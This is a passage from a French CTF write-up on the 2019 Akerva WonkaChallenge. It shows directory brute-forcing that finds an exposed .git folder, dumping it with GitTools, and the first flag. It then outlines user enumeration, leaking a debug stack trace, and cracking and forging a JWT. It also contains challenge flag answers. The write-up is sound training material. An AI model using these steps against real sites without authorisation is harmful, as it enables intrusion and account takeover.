<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Akerva] - WonkaChallenge - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Akerva] - WonkaChallenge"><meta property="og:description" content="Introduction Cette année, lors de l&rsquo;évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du WonkaChallenge réalisé par Akerva. Lors de la première édition, nous pouvions nous confronter à un certain nombre d&rsquo;épreuves, d&rsquo;abord des challenges web puis de l&rsquo;Active Directory. Les writeups officiels de l&rsquo;édition de l&rsquo;année dernière se trouvent ici :
Williwonka.shop : https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/ Pramafil.com : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/ Compromission SI pramafil : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/ Compromission du domaine DEV : https://akerva."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/wonkachall2019/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-07-20T21:57:40+08:00"><meta property="article:modified_time" content="2019-07-20T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Akerva] - WonkaChallenge"><meta name=twitter:description content="Introduction Cette année, lors de l&rsquo;évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du WonkaChallenge réalisé par Akerva. Lors de la première édition, nous pouvions nous confronter à un certain nombre d&rsquo;épreuves, d&rsquo;abord des challenges web puis de l&rsquo;Active Directory. Les writeups officiels de l&rsquo;édition de l&rsquo;année dernière se trouvent ici :
Williwonka.shop : https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/ Pramafil.com : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/ Compromission SI pramafil : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/ Compromission du domaine DEV : https://akerva."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/wonkachall2019/><link rel=prev href=maki.bzh/writeups/ecscfrench20193615incident/><link rel=next href=maki.bzh/writeups/santhacklaus2019revmomon/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Akerva] - WonkaChallenge","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/wonkachall2019\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"akeva, active directory, pentest, mimikatz, pwn, pentest, cme, web","wordcount":12727,"url":"maki.bzh\/writeups\/wonkachall2019\/","datePublished":"2019-07-20T21:57:40+08:00","dateModified":"2019-07-20T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Akerva] - WonkaChallenge</h1><div class=content id=content><h2 id=introduction>Introduction</h2><p>Cette année, lors de l&rsquo;évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du <strong>WonkaChallenge</strong> réalisé par <a href=https://akerva.com/ target=_blank rel="noopener noreffer">Akerva</a>. Lors de la première édition, nous pouvions nous confronter à un certain nombre d&rsquo;épreuves, d&rsquo;abord des challenges web puis de l&rsquo;Active Directory. Les writeups officiels de l&rsquo;édition de l&rsquo;année dernière se trouvent ici :</p><ol><li>Williwonka.shop : <a href=https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/</a></li><li>Pramafil.com : <a href=https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/</a></li><li>Compromission SI pramafil : <a href=https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/</a></li><li>Compromission du domaine DEV : <a href=https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/</a></li><li>Comme à la maison : <a href=https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/</a></li></ol><p>Cette année, le WonkaChall a continué sur la même lancée et s&rsquo;est étoffé d&rsquo;une partie pwn et Linux à la fin. Cet article a pour but de présenter ma méthode de résolution des 13 épreuves. Akerva a aussi mis en ligne un writeup officiel, que vous pouvez retrouver ci-dessous :</p><ol><li>Part 1 - WEB : <a href=https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/</a></li><li>Part 2 - WINDOWS : <a href=https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/</a></li><li>Part 3 - LINUX : <a href=https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/ target=_blank rel="noopener noreffer">https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/</a></li></ol><p>Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d&rsquo;entrer dans le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png data-srcset="/lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png, /lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png 1.5x, /lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png title=/lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png></p><p>Certaines épreuves nécessitent du Windows et d&rsquo;autres du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Ma configuration est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j&rsquo;espère que la lecture vous sera agréable !</p><p>Le point d&rsquo;entrée du challenge se trouve ici : <a href=https://willywonka.shop target=_blank rel="noopener noreffer">https://willywonka.shop</a></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif data-srcset="https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif, https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif 1.5x, https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif title=https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif></p><h2 id=i-step-1---erreur-de-développeur>I. Step 1 - Erreur de développeur</h2><blockquote><p>Let&rsquo;s start easy, what are the latest changes made to the website ?</p></blockquote><h3 id=tldr>TL;DR</h3><ol><li>Utiliser dirsearch et trouver le dossier <code>.git</code> ;</li><li>Avec <code>GitTools -> dumper -> extractor</code>, récupérer le git et les anciens commits ;</li><li>Le premier flag se situe dans le fichier <code>.git/COMMIT_EDITMSG</code>.</li></ol><hr><h3 id=i1-directory-listing>I.1. Directory listing</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step1_index.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step1_index.png, /lib/images/writeups/2019_wonkachallenge/step1_index.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step1_index.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step1_index.png title=/lib/images/writeups/2019_wonkachallenge/step1_index.png></p><p>La première chose que je fais en arrivant sur un site est lancer <code>dirsearch</code>. La wordlist par défaut est vraiment pertinente et en général, ce qu&rsquo;elle sort se transforme en quick win :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ ./dirsearch.py -u https://willywonka.shop/ -e html,php,txt           
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Extensions: .html, .php, .txt <span class=p>|</span> HTTP method: get <span class=p>|</span> Threads: <span class=m>10</span> <span class=p>|</span> Wordlist size: <span class=m>6878</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: https://willywonka.shop/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> Starting: 
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>400</span> -  166B  - /%2e%2e/google.com
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>308</span> -  263B  - /.git
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>200</span> -  973B  - /.git/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>200</span> -  449B  - /.git/branches/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>200</span> -  130B  - /.git/COMMIT_EDITMSG
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>200</span> -    1KB - /.git/hooks/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>200</span> -  276B  - /.git/config
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:23<span class=o>]</span> <span class=m>200</span> -  495B  - /.git/info/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -   73B  - /.git/description
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -   23B  - /.git/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  240B  - /.git/info/exclude
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  542B  - /.git/logs/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -    2KB - /.git/index
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  355B  - /.git/logs/HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  528B  - /.git/logs/refs/heads
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  355B  - /.git/logs/refs/heads/master
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  504B  - /.git/logs/refs
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -    2KB - /.git/objects/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -   41B  - /.git/refs/heads/master
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  545B  - /.git/refs/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  508B  - /.git/refs/heads
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:24<span class=o>]</span> <span class=m>200</span> -  445B  - /.git/refs/tags
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:35<span class=o>]</span> <span class=m>200</span> -    5KB - /login
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:35<span class=o>]</span> <span class=m>302</span> -  209B  - /logout  -&gt;  http://willywonka.shop/
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:37<span class=o>]</span> <span class=m>500</span> -  290B  - /profile
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:38<span class=o>]</span> <span class=m>200</span> -    4KB - /register
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:38<span class=o>]</span> <span class=m>200</span> -    4KB - /reset
</span></span><span class=line><span class=cl><span class=o>[</span>01:29:39<span class=o>]</span> <span class=m>302</span> -  265B  - /submit  -&gt;  http://willywonka.shop/profile?filetype<span class=o>=</span>image%2Fpng
</span></span></code></pre></td></tr></table></div></div><p>On tombe sur un dossier <code>.git</code>. Même si ce genre de dossier affiche un beau &ldquo;403 Forbidden&rdquo;, les fichiers sont souvent accessibles :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step1_git.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step1_git.png, /lib/images/writeups/2019_wonkachallenge/step1_git.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step1_git.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step1_git.png title=/lib/images/writeups/2019_wonkachallenge/step1_git.png></p><p>Il nous est donc possible de récupérer le contenu des anciens commits grâce à <code>GitTools</code>.</p><h3 id=i2-git-dumping>I.2. Git dumping</h3><p>Pour obtenir l&rsquo;intégralité du <code>git</code>, on va d&rsquo;abord utiliser le script <code>gitdumper.sh</code>, puis <code>extractor.sh</code> pour les différents commits.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ mkdir out_dump  
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Destination folder does not exist
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating a/.git/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloaded: HEAD
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ mkdir out_extract
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found commit: 7a1756aae221342ab09f9101358201bbfa70a702
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.env
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Il ne reste plus qu&rsquo;à aller chercher le flag :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cat out_dump/.git/COMMIT_EDITMSG 
</span></span><span class=line><span class=cl>Added debug mode with <span class=s2>&#34;debug=1&#34;</span> GET param
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>A wild flag appears !
</span></span><span class=line><span class=cl>16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
</span></span></code></pre></td></tr></table></div></div><h3 id=i3-flag>I.3. Flag</h3><blockquote><p>16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009</p></blockquote><hr><h3 id=ressources>Ressources</h3><ol><li><strong>maurosoria</strong>, <em>dirsearch</em>, GitHub : <a href=https://github.com/maurosoria/dirsearch target=_blank rel="noopener noreffer">https://github.com/maurosoria/dirsearch</a></li><li><strong>internetwache</strong>, <em>GitTools</em>, GitHub : <a href=https://github.com/internetwache/GitTools target=_blank rel="noopener noreffer">https://github.com/internetwache/GitTools</a></li></ol><hr><hr><h2 id=ii-step-2---une-histoire-de-jwt>II. Step 2 - Une histoire de JWT</h2><blockquote><p>A &lsquo;deadbeef&rsquo; ticket was submitted. Who&rsquo;s the victim ?</p></blockquote><h3 id=tldr-1>TL;DR</h3><ol><li>Faire de l&rsquo;audit de code grâce au <code>.git</code> trouvé dans l&rsquo;étape d&rsquo;avant, trouver le <code>debug=1</code> dans la configuration de Symphony ;</li><li>Mettre la page <code>/reset</code> en mode debug afin de récupérer une stacktrace : <code>https://willywonka.shop/reset?debug=1</code> ;</li><li>Dans la stacktrace ,trouver un sous-domaine (<code>backend.willywonka.shop</code>) et un JSON Web Token (JWT) ;</li><li>Il existe une autre page <code>/reset</code> sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie <code>backend-session</code> ;</li><li>L&rsquo;analyse du JWT récupéré dans la stacktrace montre qu&rsquo;il est protégé par une clé secrète (HS256) ;</li><li>Le bruteforcer avec <code>rockyou</code> et trouver la clé <code>s3cr3t</code> ;</li><li>Forger un nouveau token avec un utilisateur valide (<code>aas</code>) et une expiration lointaine, donnant la requête :<code>https://backend.willywonka.shop/reset/jwt_craft </code>. La liste des comptes se trouve sur la page d&rsquo;accueil du frontend ;</li><li>Une fois la mire d&rsquo;authentification passée, il ne reste qu&rsquo;à chercher le ticket <code>deadbeef</code>.</li></ol><hr><h3 id=ii1-directory-listing>II.1. Directory listing</h3><p>En enlevant les fichiers liés au <code>.git</code> du <code>dirsearch</code> précédent, il reste les pages suivantes :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11:10:46<span class=o>]</span> <span class=m>200</span> -    5KB - /login
</span></span><span class=line><span class=cl><span class=o>[</span>11:10:47<span class=o>]</span> <span class=m>302</span> -  209B  - /logout  -&gt;  http://willywonka.shop/
</span></span><span class=line><span class=cl><span class=o>[</span>11:10:51<span class=o>]</span> <span class=m>500</span> -  290B  - /profile
</span></span><span class=line><span class=cl><span class=o>[</span>11:10:52<span class=o>]</span> <span class=m>200</span> -    4KB - /register
</span></span><span class=line><span class=cl><span class=o>[</span>11:10:52<span class=o>]</span> <span class=m>200</span> -    4KB - /reset
</span></span><span class=line><span class=cl><span class=o>[</span>11:10:55<span class=o>]</span> <span class=m>302</span> -  265B  - /submit  -&gt;  http://willywonka.shop/profile?filetype<span class=o>=</span>image%2Fpng
</span></span></code></pre></td></tr></table></div></div><h3 id=ii2-enumération-dutilisateur>II.2. Enumération d&rsquo;utilisateur</h3><p>Lors de l&rsquo;utilisation de l&rsquo;application, on se rend compte qu&rsquo;il est possible de faire de l&rsquo;énumération d&rsquo;utilisateur :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png, /lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png title=/lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png></p><p>Pour tester cette théorie, j&rsquo;ai choisi une liste d&rsquo;utilisateurs provenant du GitHub SecList
. Elle est plutôt courte, donc rapide. L&rsquo;intruder de Burp fait l&rsquo;affaire pour ce test :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_intruder.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_intruder.png, /lib/images/writeups/2019_wonkachallenge/step2_intruder.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_intruder.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_intruder.png title=/lib/images/writeups/2019_wonkachallenge/step2_intruder.png></p><p>Si un utilisateur valide est soumit à l&rsquo;application, alors cette application renvoie&mldr; Une erreur 500. À savoir aussi que ce bruteforce d&rsquo;utilisateur ne sert <strong>à rien</strong> et m&rsquo;a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l&rsquo;index du site :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png, /lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png title=/lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png></p><p>Les utilisateurs sont donc :</p><ul><li>n0wait</li><li>qsec</li><li>cybiere</li><li>meywa</li><li>itm4n</li><li>aas</li><li>xXx_d4rkR0xx0r_xXx</li></ul><h3 id=ii3-ne-pas-oublier-le-git>II.3. Ne pas oublier le .git</h3><p>En regardant de plus près les sources obtenues dans le <code>.git</code> de l&rsquo;étape 1, on remarque qu&rsquo;il y a une histoire de debug. Une variable <code>/?debug=1</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
</span></span><span class=line><span class=cl><span class=c1>#index:</span>
</span></span><span class=line><span class=cl><span class=c1>#    path: /</span>
</span></span><span class=line><span class=cl><span class=c1>#    controller: App\Controller\DefaultController::index</span>
</span></span><span class=line><span class=cl>debug:
</span></span><span class=line><span class=cl>    path: /?debug<span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>    controller: <span class=c1>#TODO#</span>
</span></span></code></pre></td></tr></table></div></div><p>N&rsquo;étant pas familier avec Symphony, j&rsquo;ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, en plaçant un utilisateur valide (tel que <code>aas</code>) dans le formulaire de reset et en ajoutant le paramètre GET, le framework renvoie la stacktrace de l&rsquo;application :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png, /lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png title=/lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png></p><blockquote><p><a href="https://willywonka.shop/reset?debug=1" target=_blank rel="noopener noreffer">https://willywonka.shop/reset?debug=1</a></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
